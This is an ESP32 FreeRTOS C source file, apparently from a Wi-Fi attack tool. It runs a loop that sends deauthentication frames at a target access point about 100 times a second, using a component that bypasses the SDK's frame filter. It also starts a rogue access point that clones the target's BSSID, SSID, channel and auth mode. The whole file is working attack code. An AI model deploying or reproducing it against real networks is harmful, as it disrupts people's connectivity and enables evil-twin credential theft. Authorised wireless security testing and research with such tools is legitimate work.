#include "attack_method.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"




static const char *TAG = "main:attack_method";



static TaskHandle_t deauth_task_handle = NULL;

static wifi_ap_record_t static_ap_record;


static void deauth_task_loop(void *arg) {
   
    while (true) {
      
        wsl_bypasser_send_deauth_frame(&static_ap_record);
        
     
       
       
        vTaskDelay(pdMS_TO_TICKS(10)); 
    }
}


void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
    

    ESP_LOGI(TAG, "Starting Deauth Task (100 packets/sec)");

  
    memcpy(&static_ap_record, ap_record, sizeof(wifi_ap_record_t));

 
    xTaskCreate(
        deauth_task_loop,   
        "deauth_task",     
        2048,          
        NULL,              
        5,                 
        &deauth_task_handle 
    );
}


void attack_method_broadcast_stop(){
    if (deauth_task_handle != NULL) {
        ESP_LOGI(TAG, "Stopping Deauth Task");
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;       
    }
}



void attack_method_rogueap(const wifi_ap_record_t *ap_record){
  
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}
